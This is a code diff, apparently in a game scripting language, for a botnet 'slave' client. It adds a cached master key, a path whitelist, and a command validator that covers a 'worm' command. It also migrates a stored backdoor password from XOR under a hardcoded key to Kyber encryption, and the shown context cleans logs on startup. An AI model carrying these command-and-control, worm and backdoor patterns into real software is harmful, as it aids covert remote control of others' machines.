@@ -30,6 +30,24 @@ MY_PUBKEY_FILE = get_config("files.slave.pub")
 COMMAND_DIR = CONFIG_DIR + "/commands"
 RESPONSE_DIR = CONFIG_DIR + "/responses"
 
+// ✅ NEW: Cache for master public key
+globals.cached_master_pub = null
+
+get_master_pub = function()
+    if globals.cached_master_pub != null then
+        return globals.cached_master_pub
+    end if
+    pub = read_file(MASTER_PUBKEY_FILE)
+    if pub != null then
+        globals.cached_master_pub = pub
+    end if
+    return pub
+end function
+
+// Bot UUID for unique identification
+BOT_UUID_FILE = CONFIG_DIR + "/bot.uuid"
+BOT_UUID = null
+
 // ============================================
 // Path validation: strict whitelist enforcement
 // Prevents directory traversal attacks
@@ -39,85 +57,83 @@ safe_path = function(path)
     if path == null or path == "" then return false
     if typeof(path) != "string" then return false
     
-    // Step 1: Reject obvious dangerous patterns
-    if path.indexOf("../") == 0 then return false  // Starts with traversal
-    if path.indexOf("..") > 0 then return false   // Contains traversal anywhere
-    if path.indexOf("//") != -1 then return false   // Double slashes (potential bypass)
-    if path.indexOf("~") != -1 then return false    // Home directory reference
-    if path.indexOf("$") != -1 then return false    // Environment variable reference
+    // ============================================
+    // STEP 1: Reject obvious dangerous patterns
+    // ============================================
+    if path.indexOf("../") == 0 then return false        // Starts with ../
+    if path.indexOf("~") != null then return false        // Home directory ref
+    if path.indexOf("$") != null then return false        // Environment var
+    if path.indexOf("`") != null then return false        // Command substitution
+    if path.indexOf("//") != null then return false       // Double slashes (bypass attempt)
     
-    // Step 2: Normalize the path (resolve . and ..)
+    // ============================================
+    // STEP 2: Normalize the path
+    // ============================================
     parts = path.split("/")
     normalized = []
     
     for part in parts
         if part == "" or part == "." then
-            continue  // Skip empty and current-dir references
+            continue  // Skip empty and .
         else if part == ".." then
             if normalized.len > 0 then
                 normalized.pop  // Go up one level
             else
-                return false  // Trying to go above root — reject
-            end if
-        else
-            // Reject suspicious characters in path components
-            if part.indexOf("<") != -1 or part.indexOf(">") != -1 or part.indexOf("|") != -1 then
+                // Trying to escape root
+                log_master("DEBUG: Path traversal rejected: " + path, "DEBUG")
                 return false
             end if
-            if part.indexOf("&") != -1 or part.indexOf(";") != -1 or part.indexOf("`") != -1 then
+        else
+            // Regular directory component
+            if part.indexOf("<") != null or part.indexOf(">") != null or 
+               part.indexOf("|") != null or part.indexOf("&") != null or
+               part.indexOf(";") != null or part.indexOf("`") != null then
+                // Shell metacharacters in component
+                log_master("DEBUG: Shell metacharacter in path component: " + part, "DEBUG")
                 return false
             end if
             normalized.push(part)
         end if
     end for
     
-    clean_path = "/" + normalized.join("/")
-    
-    // Step 3: Check for symlink threats by verifying file type
-    comp = get_shell.host_computer
-    if comp != null then
-        test_file = comp.File(clean_path)
-        if test_file != null and not test_file.is_folder then
-            // It's a file, check if it's a symlink (GreyScript limitation)
-            // We can't directly check symlinks, so we rely on strict whitelist
-        end if
+    // ============================================
+    // STEP 3: Reconstruct and validate against whitelist
+    // ============================================
+    if normalized.len == 0 then
+        // Path normalized to root, only allow if explicitly in whitelist
+        return false
     end if
     
-    // Step 4: Strict whitelist matching with boundary checks
+    clean_path = "/" + normalized.join("/")
+    
+    // WHITELIST approach: only allow known-safe prefixes
     allowed_prefixes = [
         "/root/.botnet/",
         "/scripts/utils/",
+        "/scripts/tools/",
         "/bin/",
+        "/lib/",
         "/tmp/"
     ]
     
     for prefix in allowed_prefixes
-        // Match if: exact prefix match, or path starts with prefix and next char is /
         if clean_path == prefix then
-            return true
+            return true  // Exact match to allowed directory
         end if
         
         if clean_path.indexOf(prefix) == 0 then
-            // Path starts with prefix — ensure it's a directory boundary
-            rest = clean_path[prefix.len:]
-            if rest != "" and rest[0] != "/" then
-                // False positive: /scripts/utilities/file.gs would match /scripts/utils/
-                continue
+            // Starts with allowed prefix, check for boundary
+            rest = clean_path[prefix.len :]
+            if rest.len == 0 then
+                return true
             end if
-            
-            // Additional check: prevent prefix spoofing
-            // /root/.botnet-evil/file should not match /root/.botnet/
-            if prefix != "/" then
-                next_char = clean_path[prefix.len - 1]
-                if next_char != "/" then
-                    continue
-                end if
-            end if
-            
+            // Ensure next char is not part of prefix name (e.g., /root/.botnet-evil/)
+            // This is guaranteed by the "/" boundary in prefix
             return true
         end if
     end for
     
+    log_master("DEBUG: Path not in whitelist: " + clean_path, "DEBUG")
     return false
 end function
 
@@ -151,6 +167,132 @@ validate_command = function(cmd)
     return globals.validate_command(cmd)
 end function
 
+// ✅ NEW: Validate command structure BEFORE execution
+validate_command_for_execution = function(cmd)
+    if cmd == null or typeof(cmd) != "string" then return false
+
+    parts = cmd.split(" ")
+    if parts.len == 0 then return false
+
+    // Whitelist allowed commands
+    allowed_cmds = ["run", "kill", "update", "status", "clean", "worm", "read", "rotate"]
+    if allowed_cmds.indexOf(parts[0]) == null then
+        log_master("ERROR: Forbidden command: " + parts[0], "ERROR")
+        return false
+    end if
+
+    // Validate 'run' command
+    if parts[0] == "run" then
+        if parts.len < 2 then return false
+        script_path = parts[1]
+        if not safe_path(script_path) then
+            log_master("ERROR: Unsafe script path: " + script_path, "ERROR")
+            return false
+        end if
+        if not validate_script_executable(script_path) then
+            log_master("ERROR: Script not in whitelist: " + script_path, "ERROR")
+            return false
+        end if
+    end if
+
+    // Validate 'worm' command
+    if parts[0] == "worm" then
+        if parts.len < 3 then return false
+        depth = parts[2].to_int
+        if typeof(depth) != "number" or depth < 0 or depth > 10 then
+            log_master("ERROR: Invalid depth: " + parts[2], "ERROR")
+            return false
+        end if
+    end if
+
+    // Validate 'read' command
+    if parts[0] == "read" then
+        if parts.len < 2 then return false
+        file_path = parts[1]
+        if not safe_path(file_path) then
+            log_master("ERROR: Unsafe file path: " + file_path, "ERROR")
+            return false
+        end if
+    end if
+
+    return true
+end function
+
+// ============================================
+// Kyber Migration with Rollback (Item 9)
+// ============================================
+
+migrate_backdoor_password = function(comp)
+    backdoor_pass_file = CONFIG_DIR + "/backdoor_pass"
+    backdoor_pass_enc = CONFIG_DIR + "/backdoor_pass.enc"
+    backdoor_pass_backup = CONFIG_DIR + "/backdoor_pass.xor.bak"
+    
+    old_file = comp.File(backdoor_pass_file)
+    if not old_file then
+        // No old password file, nothing to migrate
+        return true
+    end if
+    
+    backdoor_pass = old_file.get_content
+    if not backdoor_pass or backdoor_pass.len == 0 then
+        // Empty password file
+        old_file.delete
+        return true
+    end if
+    
+    log_master("Migrating backdoor password from XOR to Kyber...", "INFO")
+    
+    // Step 1: Decrypt the old XOR-encrypted password
+    old_pass = null
+    if backdoor_pass.len > 4 then
+        old_pass = xor_obfuscate(backdoor_pass, "botnet_key_2026")
+    else
+        // Assume plaintext if very short
+        old_pass = backdoor_pass
+    end if
+    
+    if not old_pass or old_pass.len == 0 then
+        log_master("ERROR: Failed to decrypt old backdoor password", "ERROR")
+        return false
+    end if
+    
+    // Step 2: Create backup of XOR version (rollback)
+    if not safe_file_write(backdoor_pass_backup, backdoor_pass) then
+        log_master("WARNING: Could not create backup of old password (continuing)", "WARN")
+    end if
+    
+    // Step 3: Encrypt with Kyber
+    if not store_password_kyber(backdoor_pass_enc, old_pass) then
+        log_master("ERROR: Failed to store password with Kyber", "ERROR")
+        log_master("Rolling back to XOR backup", "WARN")
+        
+        // Rollback: keep old XOR file
+        return false
+    end if
+    
+    // Step 4: Verify we can decrypt the new version
+    verify_pass = retrieve_password_kyber(backdoor_pass_enc)
+    if not verify_pass or verify_pass != old_pass then
+        log_master("ERROR: Kyber migration verification failed", "ERROR")
+        log_master("Rolling back to XOR backup", "WARN")
+        
+        // Rollback: delete new file, restore ability to use XOR
+        new_file = comp.File(backdoor_pass_enc)
+        if new_file then new_file.delete
+        
+        return false
+    end if
+    
+    // Step 5: Only delete old file after successful verification
+    if old_file.delete == "" then
+        log_master("Backdoor password successfully migrated to Kyber", "SUCCESS")
+        return true
+    else
+        log_master("WARNING: Could not delete old XOR file (both exist)", "WARN")
+        return true  // Still consider migration successful
+    end if
+end function
+
 init = function()
     comp = get_shell.host_computer
     comp.create_folder("/root", ".botnet")
@@ -170,16 +312,8 @@ init = function()
             set_permissions(RESPONSE_DIR + "/register.enc", "600")
         end if
         
-        // NEW: Migrate existing backdoor password to Kyber
-        backdoor_pass = read_file(CONFIG_DIR + "/backdoor_pass")
-        if backdoor_pass then
-            // Migrate existing XOR'd password to Kyber
-            old_pass = xor_obfuscate(backdoor_pass, "botnet_key_2026")
-            store_password_kyber(CONFIG_DIR + "/backdoor_pass.enc", old_pass)
-            // Remove old file
-            old_file = comp.File(CONFIG_DIR + "/backdoor_pass")
-            if old_file then old_file.delete
-        end if
+        // NEW: Migrate existing backdoor password to Kyber with rollback (Item 9)
+        migrate_backdoor_password(comp)
     end if
     setup_cron()
     // Clean up logs after startup
@@ -232,7 +366,7 @@ process_commands = function()
             
             result = execute_command(cmd)
             if result == null then continue
-            pub = read_file(MASTER_PUBKEY_FILE)
+            pub = get_master_pub()  // ✅ Uses cache
             if pub == null then continue
             resp_enc = Kyber.encrypt_message(pub, result)
             if resp_enc == null then continue
@@ -247,11 +381,13 @@ process_commands = function()
 end function
 
 execute_command = function(cmd)
+    // ✅ NEW: Validate before execution
+    if not validate_command_for_execution(cmd) then
+        return "ERROR|forbidden command"
+    end if
+
     parts = cmd.split(" ")
     if parts.len == 0 then return "ERROR|empty command"
-    
-    allowed_cmds = ["run", "kill", "update", "status", "clean", "worm", "read", "rotate"]
-    if allowed_cmds.indexOf(parts[0]) == null then return "ERROR|forbidden command"
     
     if parts[0] == "run" then
         if parts.len < 2 then return "ERROR|missing script"
